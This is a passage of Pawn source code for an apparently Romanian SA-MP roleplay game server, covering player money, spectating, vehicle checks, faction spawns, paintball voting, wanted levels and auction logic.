GetPlayerBank(playerid) return bytes32(bank[playerid]);
stock CalculeazaTimp2(secunde) {
	gString[0] = (EOS);
	format(gString, 30, "%02d:%02d",secunde/60,secunde%60);
	return gString;
}

stock PlayAudioStreamForPlayersInCar(vehicleid,const url[]) {
    foreach(new playerid : VehOccupeid<vehicleid>) PlayAudioStreamForPlayer(playerid, url);
    return true;
}

stock StopAudioStreamForPlayersInCar(vehicleid) {
    foreach(new playerid : VehOccupeid<vehicleid>) StopAudioStreamForPlayer(playerid);
    return true;
}
stock PlayerMoney(playerid, amount) return GetPlayerCash(playerid) < amount ? (true) : (false);

stock format64bit(int_64, int_32, const szChar[] = ".") {
	new szStr[25];
	if(!int_64) format(szStr, 25,"%d", int_32);
	else format(szStr, 25,"%d%09d", int_64, int_32);
	for(new iLen=strlen(szStr)-3;iLen>0;iLen-=3) strins(szStr, szChar, iLen);
	return szStr;
}
stock GivePlayerCash(playerid, cash) {
	addBytes32(money[playerid], cash);
 	ResetPlayerMoney(playerid);
 	GivePlayerMoney(playerid, bytes32(money[playerid]));
	return true;
}

stock checker(const string[],pos=-1) {
    while(string[++pos]) if(NOT_IN_RANGE(string[pos],'A','Z'+1)) continue; else break;
    while(string[++pos]) if(NOT_IN_RANGE(string[pos],'0','9'+1)) continue; else return true;
    return false;
}
stock IsMail(const string[],len=-1) {
    if((len=strlen(string))<15) return false;
    if(string[len-4]!='.'||string[len-10]!='@') return false;
    return true;
}

stock Getspec(i) {
	new 
		Float:health, Float: armour
	;

	new targetid = Spectate[i];	
	if(IsPlayerConnected(targetid)) {
	    GetPlayerHealthEx(targetid, health);
	    GetPlayerArmourEx(targetid, armour);
    
	    if(GetPlayerState(targetid) == PLAYER_STATE_DRIVER) {						    
	        new Float:Valoarea;
	        new carid = GetPlayerVehicleID(targetid);
			GetVehicleHealth(carid,Valoarea);
			new speed = Carspeed(GetPlayerVehicleID(targetid));
			format(gString, sizeof gString, "%s (ID: %d)~n~Level: ~y~~h~~h~%d (%.2fh)~n~~w~~h~Health: ~y~~h~~h~%.1f ~w~~h~Armour: ~y~~h~~h~%.1f~n~~w~~h~FPS: ~y~~h~~h~%d ~w~~h~Ping: ~y~~h~~h~%d~n~~w~~h~Speed: ~b~~h~%d ~w~~h~(%.1f HP)~n~~w~~h~Wanted level: ~r~%d", GetName(targetid), targetid, PlayerInfo[targetid][pLevel], PlayerInfo[targetid][pConnectTime], health, armour, FPS2[targetid], GetPlayerPing(targetid), speed, Valoarea, PlayerInfo[targetid][pWantedLevel]);
		}			
		else format(gString, sizeof gString, "%s (ID: %d)~n~Level: ~y~~h~~h~%d (%.2fh)~n~~w~~h~Health: ~y~~h~~h~%.1f ~w~~h~Armour: ~y~~h~~h~%.1f~n~~w~~h~FPS: ~y~~h~~h~%d ~w~~h~Ping: ~y~~h~~h~%d~n~~w~~h~Wanted level: ~r~%d", GetName(targetid), targetid, PlayerInfo[targetid][pLevel], PlayerInfo[targetid][pConnectTime], health, armour, FPS2[targetid], GetPlayerPing(targetid), PlayerInfo[targetid][pWantedLevel]);
		PlayerTextDrawSetString(i, SpectatorTD, gString);
		if(GetPlayerInterior(targetid) >= 0) SetPlayerInterior(i,GetPlayerInterior(targetid));
		if(GetPlayerVirtualWorld(targetid) >= 0) SetPlayerVirtualWorld(i,GetPlayerVirtualWorld(targetid));
	}
	return true;
}


stock IsAMember(playerid) return IsMafie(playerid);

redist::IsACop(playerid) {
	switch(PlayerInfo[playerid][pMember]) { case 1,2,3,14,19: return true; }
	switch(PlayerInfo[playerid][pLeader]) { case 1,2,3,14,19: return true; }
	return false;
}

redist::IsAtClothShop(playerid) {
	if(IsPlayerInRangeOfPoint(playerid, 50.0,207.5627,-103.7291,1005.2578) || IsPlayerInRangeOfPoint(playerid, 50.0,203.9068,-41.0728,1001.8047)) return true;
	else if(IsPlayerInRangeOfPoint(playerid, 50.0,214.4470,-7.6471,1001.2109) || IsPlayerInRangeOfPoint(playerid, 50.0,161.3765,-83.8416,1001.8047) || IsPlayerInRangeOfPoint(playerid, 50.0,204.2205,-168.3091,1000.5234)) return true;
	return false;
}

redist::IsAtBank(playerid) return PlayerToPoint(30, playerid, 2312.0747,-6.9872,26.7422) ? (true) : (false);
redist::IsAtOrderPlace(playerid) return PlayerToPoint(50, playerid, 2550.8948,-1296.6689,1054.6406) ? (true) : (false);

redist::IsABoat(carid) {
	if(GetVehicleModel(carid) == 430 || GetVehicleModel(carid) == 446 || GetVehicleModel(carid) == 452 || GetVehicleModel(carid) == 453 || GetVehicleModel(carid) == 454 || GetVehicleModel(carid) == 472 || GetVehicleModel(carid) == 473 || GetVehicleModel(carid) == 484 || GetVehicleModel(carid) == 493 || GetVehicleModel(carid) == 595)
		return true;
	return false;
}

redist::IsAPlane(carid) {
	switch(carid) {
		case 417, 425, 447, 460, 464, 465, 469, 476, 487, 488, 497, 501, 511, 512, 513, 519, 520, 548, 553, 563, 577, 592, 593: return true;
	}
	return false;
}
redist::Copcar2(carid) {
	switch(ServerVehicles[carid][vFaction]) {
		case 1,2,3,14,19: return true;
	}
	return false;
}

redist::IsAnAmbulance(carid) return ServerVehicles[carid][vFaction] == 13 ? (true) : (false);
redist::IsABike(carid) {
	switch(carid) {
		case 481, 509, 510: return true;
	}
	return false;
}
redist::IsABike2(vehicleid) {
	switch (GetVehicleModel(vehicleid)) {
		case 448, 461, 462, 463, 468, 471, 481, 509, 510, 521, 522, 523, 568, 571, 581, 586: return true;
	}
	return false;
}

new RandomMSG[][] = {
	"Daca ai nevoie de ajutor, nu ezita sa folosesti comanda (/n) iar un helper te va ajuta in cel mai scurt timp.",
	"Ai vazut un codat? Foloseste comanda (/report) iar un admin se va ocupa de el.",
	"Vrei sa faci o sugestie? Atunci, nu ezita sa faci un topic in sectiunea 'Sugestii' de pe forum-ul nostru. (/forum)",
	"Ai aptitudini speciale in manuirea armelor? Atunci dovedeste asta in arena de paintball. (/gps)",
	"Ai nevoie de o licenta? Foloseste comanda (/service instructor) iar un instructor te va ajuta!",
	"Ai ramas pe jos in pustietate? Poti chema un taxi folosind comanda (/service taxi) iar un taximetrist te va ajuta.",
	"Vrei sa vezi misiunile tale zilnice? Atunci foloseste comanda (/quests)",
	"Vrei sa faci parte dintr-o factiune? Foloseste comanda (/factions) pentru a vedea factiunile cu locuri libere.",
	"Ai nevoie de un vehicul? Foloseste comanda (/buycar) atunci cand esti la Dealership.",
	"Doresti sa iti vizualizezi statisticile? Foloseste comanda (/stats).",
	"Foloseste comanda (/gps) pentru a vedea locatiile importante ale server-ului.",
	"Te-a suparat cineva? Foloseste comanda (/contract) iar un hitman se va ocupa de el!",
	"Vrei sa te intreci cu prietenii tai pe un circuit de curse? Arena de curse va asteapta, folositi comanda (/gps)",
	"Ai noroc la pariuri? Atunci casino-ul este locul vostru!"
};

task SendMSG[60000*10]() return SCMTA(0x4DA75AFF, RandomMSG[random(sizeof(RandomMSG))]);

task checkVehiclesDespawn[60*1000*5]() {
	new Float: x, Float: y, Float: z;
	foreach(new i : logged_players) {
		GetPlayerPos(i, x, y, z);
		if(VehicleRent[i] && !IsVehicleOccupied(VehicleRent[i]) && GetVehicleDistanceFromPoint(VehicleRent[i], x,y,z) > 300 && InInterior[i] == INVALID_INTERIOR && AFKSeconds[i]>120) destroy_rent_car(i);
		if(PlayerInfo[i][pTutorial]<5) SendClientMessage(i, COLOR_RED, "Nu ai terminat tutorialul! Pentru a vedea ce pas trebuie sa faci, ai la dispozitie (/tutorial).");
	}
	return true;
}

redist::Camera(playerid) {
	InterpolateCameraPos(playerid, 2054.789306, 2374.163085, 63.134944, 2049.733154, 783.634155, 56.907676, 60000);
	InterpolateCameraLookAt(playerid, 2054.968750, 2369.179443, 62.772300, 2049.677246, 788.422241, 55.468597, 60100);
	SetPlayerPos(playerid, 2269.6230, -74.9329, 26.7724);
	SetPlayerVirtualWorld(playerid, 9999);
	return true;
}

redist::ClearCrime(playerid) {
	PlayerInfo[playerid][pCrime][0]=EOS;
	_query("UPDATE `users` SET `crime` = '%s' WHERE `id` = '%i'", PlayerInfo[playerid][pCrime],PlayerInfo[playerid][pSQLID]);
	
	foreach(new i : StreamedPlayer[playerid]) OnPlayerStreamOut(i, playerid);
	return true;
}

stock IsNearPlayer(playerid, targetid, Float:x=0.0,Float:y=0.0,Float:z=0.0) 
	return (GetPlayerPos(playerid,x,y,z)&&IsPlayerInRangeOfPoint(targetid, 20.0, x,y,z)&&GetPlayerVirtualWorld(targetid)==GetPlayerVirtualWorld(playerid));

resetPvar(playerid) {
	InitFly(playerid);	
	PlayerInfo[playerid]=PlayerInfo[MAX_PLAYERS];
	rob_invite[playerid]=raceVoted[playerid][0]=TaxiDriver[playerid]=
	call_player[playerid]=HaveHelper[playerid]=cerereFriends[playerid]=
	inGarage[playerid]=lastPlayerInTaxi[playerid]=dialogID[playerid]=
	IsSafeZone[playerid]=GarageArea[playerid]=PlayerAreaID[playerid]=
	CaseInvite[playerid]=VehicleKey[playerid]=hideHungry[playerid]=
	HiddenTrade[playerid]=TradeID[playerid]=DiceMoney[playerid]=
	HouseTrade[playerid]=SkinTrade[playerid]=BusinessTrade[playerid]=
	laser_trade[playerid]=PnsTimer[playerid]=DealerID[playerid]=
	LastPns[playerid]=jobTrade[playerid]=hat_trade[playerid]=
	jobInvite[playerid]=jobWork[playerid]=CrateModel[playerid]=
	CarTrade[playerid]=posible_wanted[playerid]=CarEID[playerid]=
	EditVehicleID[playerid]=Lesson[playerid]=InLesson[playerid]=
	DMGTimer[playerid]=MDCOn[playerid]=AcceptedService[playerid]=
	LicenseOffer[playerid]=TradePlayer[playerid]=DiceID[playerid]=
	Reply[playerid]=HaveHelp[playerid]=PlayerHit[playerid]=
	RepairOffer[playerid]=LiveOffer[playerid]=DrugOffer[playerid]=
	TicketOffer[playerid]=FreeOffer[playerid]=RefillOffer[playerid]=
	TradeAccepted[playerid]=Mobile[playerid]=Spectate[playerid]=
	AcceptOffer[playerid]=targetfind[playerid]=MatsOffer[playerid]=
	SellgunOffer[playerid]=playerDeath[playerid]=TalkingLive[playerid]=InvitedBy[playerid]=
	request_number[playerid]=-1;

	forcenamechange[playerid]=request_name[playerid]=request_clan[playerid]=DontSpec[playerid]=SpecialJobWorking[playerid]=false;
	cp_pos_x[playerid] = 0.0;

	new reset_var[12] = {0, ...};
	missed_calls[playerid] = reset_var;
	PlayerTextID[playerid] = resetVarPTD;
	PinInsert[playerid][0]='\0';
	PlayerAreaType[playerid] = INVALID_AREA_ID;
	JobTime[playerid]=JobDeelay[playerid]=gettime();

	new rvarr[sizeof DeelayCommand[]] = {-1, ...}; DeelayCommand[playerid]=rvarr;

	raceVoted[playerid][1]=enterVehicle[playerid]=is_player_death[playerid]=
	togClanTurf[playerid]=RegisrationStep[playerid][0]=RegisrationStep[playerid][1]=
	RegisrationStep[playerid][2]=RegisrationStep[playerid][3]=InHand[playerid]=
	Refueling[playerid]=false;

	VehicleHealth[playerid]=0.0;

	TaxiDuty[playerid] = false;

	BlockEnter[playerid] = true;

	togAdmin[playerid]=togHelper[playerid]=1;

	PlayRadio[playerid]=route_selected[playerid]=value_report[playerid]=
	report_type[playerid]=LoginTime[playerid][0]=LoginTime[playerid][1]=
	total_vehicle_in_garage[playerid]=PKills[playerid]=PDeaths[playerid]=
	TextCount[playerid]=IsPlayerOnTurf[playerid]=listitemmm[playerid]=
	hideInfo[playerid]=truckerRoot[playerid]=TestingModel[playerid]=
	player_selected[playerid]=MyVehicleSpawn[playerid]=LumberObj[playerid][0]= 
	LumberObj[playerid][1]=LumberObj[playerid][2]=LumberObj[playerid][3]=
	LumberObj[playerid][4]=LumberObj[playerid][5]=editObjectType[playerid]=
	StepExam[playerid]=ExamTime[playerid]=MiliardTrade[playerid]=
	TradeTicket[playerid][0]=TradeTicket[playerid][1]=MoneyTrade[playerid]=
	VoucherTrade[playerid][0]=VoucherTrade[playerid][1]=VoucherTrade[playerid][2]=
	VoucherTrade[playerid][3]=VoucherTrade[playerid][4]=clan_trade[playerid]=
	p_Ticket[playerid]=c_Ticket[playerid]=material_trade[playerid]=
 	GunID[playerid]=BetPacanele[playerid]=
 	TotalBet[playerid]=TimerPayDay[playerid]=CrateTime[playerid]=
 	BagTime[playerid]=AlegeCrates[playerid]=SkinsActions[playerid]=
 	Aduty[playerid]=EnableBoast[playerid]=Exception[playerid]=
 	WarKills[playerid]=WarDeaths[playerid]=
 	Escape[playerid]=Escape2[playerid]=EscapeProces[playerid]=
 	Combo[playerid]=Question[playerid]=CheatWarnings[playerid]=
 	togevent[playerid]=togding[playerid]=SpecClan[playerid]=
 	License[playerid]=togclan[playerid]=SpecFaction[playerid]=
 	Helmet[playerid]=ReportTimer[playerid]=Freezed[playerid]=
 	AFKSeconds[playerid]=HeadValue[playerid]=toglicitatie[playerid]=
 	Ajutor[playerid]=PaintType[playerid]=
 	fishCount[playerid]=HaveFish[playerid]=TotalMoney[playerid]=
 	HelperDuty[playerid]=WantedTime[playerid]=LastCar[playerid]=
 	ClanDuty[playerid]=StartedSpray[playerid]=StartedSpray2[playerid]=
 	pDrunkLevelLast[playerid]=FPS2[playerid]=HidePM[playerid]=
 	PhoneOnline[playerid]=UsingDrugs[playerid]=UsedFind[playerid]=
 	CP[playerid]=OnDuty[playerid]=RepairPrice[playerid]=
 	RepairCar[playerid]=TakingLesson[playerid]=RefillPrice[playerid]=
 	PlayerCuffed[playerid]=PlayerCuffedTime[playerid]=DrugPrice[playerid]=
 	PlayerCuffed2[playerid]=DrugGram[playerid]=gOoc[playerid]=
	PlayerTied[playerid]=gLastCar[playerid]=gNews[playerid]=gFam[playerid]=
	gPlayerLogTries[playerid]=FreePrice[playerid]=PlayerTazeTime[playerid]=
	PlayerStoned[playerid]=AcceptPrice[playerid]=TicketMoney[playerid]=
	TurfsDisp[playerid]=TransferMoney[playerid]=IsSmoking[playerid]=
	InInterior[playerid]=InInteriorID[playerid]=MatsPrice[playerid]=
	MatsAmmo[playerid]=SellgunPrice[playerid]=SellgunMats[playerid]=
	SellgunAmmo[playerid]=SellgunID[playerid]=togfind[playerid]=
	tazer[playerid]=WTChannel[playerid]=toglc[playerid]=shotTime[playerid]=
	shot[playerid]=InExamen[playerid]=ExamCar[playerid]=VehicleRent[playerid]=
	InvitedType[playerid]=InvitedType[playerid]=news_50min[playerid]=DebugClanVehicleTimer[playerid]=player_td_page[playerid]=
	PlayerInfo[playerid][pBackpackLevel]=
	0;
}

redist::SetPlayerSpawn(playerid) {
	InInterior[playerid] = InInteriorID[playerid] = INVALID_INTERIOR;
	if(PlayerInfo[playerid][pHat] != 0 && PlayerInfo[playerid][pShowHat] == 1) PutHat(playerid);
	
	if(Spectate[playerid] != -1) {
		Iter_Remove(MySpec<Spectate[playerid]>, playerid);
		Spectate[playerid] = -1;
		PlayerInfo[playerid][pChatCMD]=0;
		InInterior[playerid] = Unspec[playerid][sInInterior];
		InInteriorID[playerid] = Unspec[playerid][sInInteriorID];
		Iter_Remove(StreamedPlayer[playerid], playerid);
		SetPlayerPos(playerid, Unspec[playerid][sPx], Unspec[playerid][sPy], Unspec[playerid][sPz]);
		SetPlayerInterior(playerid, pInteriorID[playerid]);
		SetPlayerVirtualWorld(playerid, pVirtual[playerid]);
		if(Unspec[playerid][sInVehicle]) {
			if(!put_player_in_vehicle(playerid, Unspec[playerid][sInVehicle])) SetPlayerPos(playerid, Unspec[playerid][sPx], Unspec[playerid][sPy], Unspec[playerid][sPz]);
		} else SetPlayerPos(playerid, Unspec[playerid][sPx], Unspec[playerid][sPy], Unspec[playerid][sPz]);
		SendClientMessage(playerid, COLOR_WHITE, "You have been teleported to the last known location. (spec off)");
		PlayerTextDrawHide(playerid, SpectatorTD);
		Iter_Add(StreamedPlayer[playerid], playerid);
		return true;
	}
	new house = PlayerInfo[playerid][pHouse];	
	if(PlayerInfo[playerid][pJailed] >= 1) {
		SetPlayerWantedLevel(playerid, 0);
		if(PlayerInfo[playerid][pAJail] == 1) {
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 64);
			new randd = random(4);
			switch(randd) {
				case 0: SetPlayerPos(playerid, 215.16264, 109.91039, 999.04541);
				case 1: SetPlayerPos(playerid, 219.32300, 109.51270, 999.04541); 
				case 2: SetPlayerPos(playerid, 223.18578, 109.69960, 999.04541);
				case 3: SetPlayerPos(playerid, 227.50655, 109.76337, 999.04541);
			}
		}
		else PutPlayerInJail(playerid);	
		return true;
	}
	switch(SpawnChange[playerid]) {
		case 1: {
			if house == 999 *then return true;
			SetPlayerToTeamColor(playerid);
			SetPlayerInterior(playerid,HouseInfo[house][hInterior]);
			SetPlayerPos(playerid, HouseInfo[house][hExitx], HouseInfo[house][hExity],HouseInfo[house][hExitz]);
			SetPlayerVirtualWorld(playerid, HouseInfo[house][hVirtual]);
			InInterior[playerid] = HOUSE_INTERIOR;
			InInteriorID[playerid] = house;
			HouseRadio(playerid, house);
		} 
		case 2: {
			if !ClanInfo[PlayerInfo[playerid][pClan]][clHQ] *then return true;
			new 
				clanid = PlayerInfo[playerid][pClan],
				idd = ClanInfo[clanid][clHQ]
			;
		 	SetPlayerToTeamColor(playerid);
		 	SetPlayerInterior(playerid, 18);
		 	SetPlayerPos(playerid, ClanHQInfo[idd][cEnterX], ClanHQInfo[idd][cEnterY], ClanHQInfo[idd][cEnterZ]);
		 	SetPlayerVirtualWorld(playerid, ClanHQInfo[idd][cVirtualWorld]);
		 	InInterior[playerid] = CLANHQ_INTERIOR;
		 	InInteriorID[playerid] = idd;	
		}
		default: {
			SetPlayerToTeamColor(playerid);
		    static fid;
		    if(!(fid=PlayerInfo[playerid][pMember])) {
		        SetPlayerInterior(playerid, 0);
				if(PlayerInfo[playerid][pTutorial]>=5&&PlayerInfo[playerid][pCarLicT]>gettime()) {
					new rr=random(3);
					SetPlayerPos(playerid, spawn_random[rr][0], spawn_random[rr][1], spawn_random[rr][2]);
					SetPlayerFacingAngle(playerid, spawn_random[rr][3]);
					SetPlayerVirtualWorld(playerid, 0);
				} else {
					SetPlayerPos(playerid,spawn_random[0][0], spawn_random[0][1], spawn_random[0][2]), SetPlayerFacingAngle(playerid, spawn_random[0][3]);
					SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pTutorial]>=5?0:playerid + 10);
				}
		        return true;
		    }
		    if(FactionSpawn[playerid] > 0) {
		    	SetPlayerInterior(playerid, DynamicFactions[FactionSpawn[playerid]][fInterior]);
			    SetPlayerVirtualWorld(playerid, DynamicFactions[FactionSpawn[playerid]][fVW]);
			    ClearAnimations(playerid);
			    SetPlayerPos(playerid, DynamicFactions[FactionSpawn[playerid]][fcX], DynamicFactions[FactionSpawn[playerid]][fcY], DynamicFactions[FactionSpawn[playerid]][fcZ]); 
			    InInterior[playerid] = HQ_INTERIOR;
			    InInteriorID[playerid] = FactionSpawn[playerid];
			    return true;
		    }
		    SetPlayerInterior(playerid, DynamicFactions[fid][fInterior]);
		    SetPlayerVirtualWorld(playerid, DynamicFactions[fid][fVW]);
		    ClearAnimations(playerid);
		    SetPlayerPos(playerid, DynamicFactions[fid][fcX], DynamicFactions[fid][fcY], DynamicFactions[fid][fcZ]); 
		    InInterior[playerid] = HQ_INTERIOR;
		    InInteriorID[playerid] = fid;
		}
	}
	return true;
}
cmd:lockhq(playerid, params[]) {
	if(PlayerInfo[playerid][pLeader] == 0) return true;
	new i = PlayerInfo[playerid][pLeader];
	DynamicFactions[i][fLock] = !DynamicFactions[i][fLock];
	SendClientMessage(playerid, 0xFFADADFF, "Modificari actualizate!");
	_query("UPDATE `factions` SET `Lock`='%d' WHERE `ID`='%d'", DynamicFactions[i][fLock], i);
	updateFaction(i, true);
	return true;
}
stock GetName(playerid) {
	new name[MAX_PLAYER_NAME];
	if(!Iter_Contains(Acovers, playerid)) format(name, MAX_PLAYER_NAME, PlayerInfo[playerid][pUsername]);
	else GetPlayerName(playerid, name, MAX_PLAYER_NAME);
    return name;
}

redist::CalculateVote(paintid) {
	PaintTime[paintid] = 0;
	if(PlayersOnPaint(paintid) < 2) return SendPaintMessage(paintid+1, COLOR_CLIENT, "Votarea a fost anulata deoarece este un singur player.");

	new map;
	PaintVote[paintid] = 0;
	if(MapVotes[paintid][0] >= MapVotes[paintid][1] && MapVotes[paintid][0] >= MapVotes[paintid][2] && MapVotes[paintid][0] >= MapVotes[paintid][3] && MapVotes[paintid][0] >= MapVotes[paintid][4] && MapVotes[paintid][0] >= MapVotes[paintid][5]) map = 0;
	else if(MapVotes[paintid][1] >= MapVotes[paintid][0] && MapVotes[paintid][1] >= MapVotes[paintid][2] && MapVotes[paintid][1] >= MapVotes[paintid][3] && MapVotes[paintid][1] >= MapVotes[paintid][4] && MapVotes[paintid][1] >= MapVotes[paintid][5]) map = 1;
	else if(MapVotes[paintid][2] >= MapVotes[paintid][0] && MapVotes[paintid][2] >= MapVotes[paintid][1] && MapVotes[paintid][2] >= MapVotes[paintid][3] && MapVotes[paintid][2] >= MapVotes[paintid][4] && MapVotes[paintid][2] >= MapVotes[paintid][5]) map = 2;
	else if(MapVotes[paintid][3] >= MapVotes[paintid][0] && MapVotes[paintid][3] >= MapVotes[paintid][1] && MapVotes[paintid][3] >= MapVotes[paintid][2] && MapVotes[paintid][3] >= MapVotes[paintid][4] && MapVotes[paintid][3] >= MapVotes[paintid][5]) map = 3;
	else if(MapVotes[paintid][4] >= MapVotes[paintid][0] && MapVotes[paintid][4] >= MapVotes[paintid][1] && MapVotes[paintid][4] >= MapVotes[paintid][2] && MapVotes[paintid][4] >= MapVotes[paintid][3] && MapVotes[paintid][4] >= MapVotes[paintid][5]) map = 4;
	else if(MapVotes[paintid][5] >= MapVotes[paintid][0] && MapVotes[paintid][5] >= MapVotes[paintid][1] && MapVotes[paintid][5] >= MapVotes[paintid][2] && MapVotes[paintid][5] >= MapVotes[paintid][3] && MapVotes[paintid][5] >= MapVotes[paintid][4]) map = 5;
	
	PaintballWinner[paintid] = -1;
	PaintballWinnerScore[paintid] = 0;
	PaintMap[paintid] = map;
	PaintTime[paintid] = 300;
	MapVotes[paintid][0] = 0; MapVotes[paintid][1] = 0; MapVotes[paintid][2] = 0; MapVotes[paintid][3] = 0; MapVotes[paintid][4] = 0; MapVotes[paintid][5] = 0; 
	foreach(new i : InPaint<paintid>) Voted[i] = 0, SpawnPlayer(i), GameTextForPlayer(i, "~y~Start!", 5000, 3), PlayerTextDrawSetString(i, PaintTD, "~n~loading.."), PlayerTextDrawShow(i, PaintTD);
	return true;
}

stock MapName(paint) {
	switch(PaintMap[paint]) {
		case 0: srsString = "rc_arena";
		case 1: srsString = "farm";
		case 2: srsString = "island";
		case 3: srsString = "desert";
		case 4: srsString = "beach";
		case 5: srsString = "forest";		
	}
	return srsString;
}

stock MapName2(paint) {
	switch(paint) {
		case 0: srsString = "rc_arena";
		case 1: srsString = "farm";
		case 2: srsString = "island";
		case 3: srsString = "desert";
		case 4: srsString = "beach";
		case 5: srsString = "forest";
	}
	return srsString;
}

redist::PlayCopSound() {
	for(new f,_x[5]={1,2,3,14,19};f!=sizeof _x;f++) {
		foreach(new i : faction_players<_x[f]>) PlayerPlaySound(i, 2606, 0, 0, 0);
	}
	return true;
}

redist::Banlog(const ip[], const name[], const admin[], const reason[],day) {
	_query("INSERT INTO banlog (`ip`,`player`,`admin`,`reason`,`day`) VALUES ('%s','%s','%s','%s','%d')",ip,name,admin,reason,day);
	return true;
}

redist::Transferlog(const name[], const name2[],psql1,psql2,money) {
	new y,m,d,h,mi,s; getdate(y,m,d); gettime(h,mi,s);
	mysql_format(SQL, gQuery, sizeof gQuery,"INSERT INTO transferlog (`Name`,`Name2`,`psql1`,`psql2`,`money`,`time`) VALUES ('%s','%s','%d','%d','%d','%02d/%02d/%d %02d:%02d:%02d')", name, name2,psql1,psql2,money,d,m,y,h,mi,s);
	mysql_tquery(SQL, gQuery, "", "");
	return true;
}
redist::IsAttached(vehid) {
	foreach(new i : logged_players) {
		if(GetVehicleTrailer(GetPlayerVehicleID(i)) == vehid && vehid != 0) return true;
	}
	return false;
}



stock UpdateJobStats(playerid) {
	if(!JobWorking[playerid] || JobWorking[playerid] == 2 || !PlayerInfo[playerid][pShowJob]) return true;
	new i = playerid; gString[0] = (EOS);
	switch(PlayerInfo[playerid][pJob]) {
		case 1: format(gString,128, "Skill: %d/6 (worked %d/%d times)~n~You have to work another ~r~%d seconds~w~~h~.", GetPlayerSkill(i), PlayerInfo[i][pJobSkillPoints][PlayerInfo[i][pJob]], GetNeedPoints(i, PlayerInfo[i][pJob]), JobSeconds[i]);
		case 2: {
			new x = truckerRoot[playerid]/3, y = truckerRoot[playerid] % 3;
			format(gString, 128, "Skill: %d/6 (worked %d/%d times)~n~Selected location: %s (%s)~n~Shifts made %d and $%s money earned.", GetPlayerSkill(i), PlayerInfo[i][pJobSkillPoints][PlayerInfo[i][pJob]], GetNeedPoints(i, PlayerInfo[i][pJob]), Get3DZone(gNewTruckerCP[x][y][0], gNewTruckerCP[x][y][1], gNewTruckerCP[x][y][2]), truckerRoute[x], CurseFacute[playerid], FormatNumber(MoneyEarned[playerid]));
		}
		default: format(gString,128, "Skill: %d/6 (worked %d/%d times)~n~Shifts made %d $%s money earned.", GetPlayerSkill(i), PlayerInfo[i][pJobSkillPoints][PlayerInfo[i][pJob]], GetNeedPoints(i, PlayerInfo[i][pJob]), CurseFacute[playerid], FormatNumber(MoneyEarned[playerid]));
	}
	PlayerTextDrawSetString(i, JobTD, gString);
	PlayerTextDrawShow(i, JobTD);
	return true;
}	
	
stock SetPlayerCriminal(playerid, declare, const reason[], const complice[] = "") {
	new turner[MAX_PLAYER_NAME] = "unknown";
	if declare != -1 *then strmid(turner, PlayerInfo[declare][pUsername], 0, MAX_PLAYER_NAME);
	if ++PlayerInfo[playerid][pWantedLevel] > 6 *then PlayerInfo[playerid][pWantedLevel]=6;
	format(PlayerInfo[playerid][pCrime], 64, "complice - %s reporter: %s", complice, PlayerInfo[playerid][pUsername]);
	_query("UPDATE `users` SET `crime` = '%s' WHERE `id`='%i'", PlayerInfo[playerid][pCrime], PlayerInfo[playerid][pSQLID]);
	WantedTime[playerid] = 15 * 60;
	format(gString, sizeof gString, "Ai comis o noua crima (%s) raportata de %s. Wanted actual: %d.", reason, turner, PlayerInfo[playerid][pWantedLevel]);
	SendClientMessage(playerid, COLOR_WARNING, gString);
	SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
	SendTeamMessage(1,0x2e64feFF,"Dispatch: %s [%d] has commited a crime: %s. Reporter: %s. New wanted level: %d.",GetName(playerid),playerid,reason,turner,PlayerInfo[playerid][pWantedLevel]);
	UpdateVar(playerid, "WantedLevel", PlayerInfo[playerid][pWantedLevel]);
	foreach(new i : StreamedPlayer[playerid]) {
		if !IsACop(i) || !OnDuty[i] *then continue;
		SetPlayerMarkerForPlayer(i, playerid, 0xe3336d00);
	}
	return true;
}

stock DeelayTime(playerid, id) return SCMf(playerid, COLOR_LGREEN, "You can't use this command for %d seconds.", DeelayCommand[playerid][id]-gettime());

redist::sql_cache_licitatie() {
	SCMTA(0xAA71B7FF, "[BID] Licitatia s-a terminat.");
	new _name[MAX_PLAYER_NAME] = {"offline"}, playerid=-1, id=IDLicitatie;
	cache_get_value_name_int(0, "Status", playerid);
	if(playerid!=-1) {
		format(_name, sizeof _name, "%d", playerid);
		if(TipLicitatie==0||TipLicitatie==1||TipLicitatie==2||TipLicitatie==3||TipLicitatie==5) {
			ByteVar1@bank[playerid] -= eBit:(bid_money/1000);
			GivePlayerBank(playerid, -(bid_money%1000)*1000000);
			_query("UPDATE `users` SET `Bank` = `Bank` - '%i%09d' WHERE `id` = '%i'", bid_money/1000, (bid_money%1000)*1000000, LastPlayer);
			if(PlayerInfo[playerid][pShowBanca] == 1) {
				format(gString, 45, "$%s", formatBytes(bank[playerid]));
				PlayerTextDrawSetString(playerid, BancaTD, gString);
			}
			format(gString, 128, "[BID] Cel mai mult a licitat %s (%s) cu suma de $%s.000.000.", _bid_name, _name, FormatNumber(bid_money));
			SCMTA(0xAA71B7FF, gString);
		}
		else if(TipLicitatie==4) {
			PlayerInfo[playerid][pPremiumPoints] -= bid_money;
			_query("UPDATE `users` SET `GoldPoints` = `GoldPoints` - '%i' WHERE `id` = '%i'", bid_money, LastPlayer);
			format(gString, 128, "[BID] Cel mai mult a licitat %s (%s) cu suma de %sPP", _bid_name, _name, FormatNumber(bid_money));
			SCMTA(0xAA71B7FF, gString);
		}
	}
	switch(TipLicitatie) {
		case 1: {
			if(strcmp(HouseInfo[id][hOwner], "The State", true)) {
				format(gString, 128, "Ai pierdut casa (%d) deoarece a fost licitata din cauza inactivitatii tale.", IDLicitatie);
				InsertEmail(HouseInfo[id][hOwner], "AdmBot", gString);
				mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `House` = '%i' LIMIT 1", HouseInfo[id][hID]);
				mysql_tquery(SQL, gQuery, "sql_cache_licitatie_id");
				mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `House`='999' WHERE `House`='%d'", HouseInfo[id][hID]);
				mysql_tquery(SQL, gQuery);
			}
			if(playerid!=-1) {
				SCMf(playerid, COLOR_YELLOW, "Ai primit casa %d cu succes. Felicitari!", id);
				PlayerInfo[playerid][pHouse] = id; PlayerInfo[playerid][pRented] = -1;
				HouseInfo[id][hOwned] = 1; HouseInfo[id][hValue] = 0;
			}
			strmid(HouseInfo[id][hOwner], _bid_name, 0, MAX_PLAYER_NAME);
			mysql_format(SQL, gQuery, 128, "UPDATE `users` SET `House` = '%i' WHERE `id` = '%i'", id, LastPlayer);
			mysql_tquery(SQL, gQuery);
